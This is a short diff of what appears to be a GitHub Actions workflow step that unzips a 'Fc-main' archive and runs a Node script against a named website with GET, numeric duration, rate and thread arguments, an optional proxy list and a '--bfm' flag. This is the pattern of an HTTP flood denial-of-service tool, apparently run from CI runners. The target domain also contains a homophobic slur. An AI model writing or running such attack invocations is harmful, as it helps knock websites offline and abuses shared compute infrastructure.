@@ -37,7 +37,7 @@ jobs:
           unzip Fc-main.zip 
           
           cd Fc-main
-          node  a.js GET https://cantddosmefaggot.lol/ 800 4 90 proxy.txt --bfm --debug 
+          node  y.js GET https://cantddosmefaggot.lol/ 800 4 90  --bfm --debug 
 
           
 
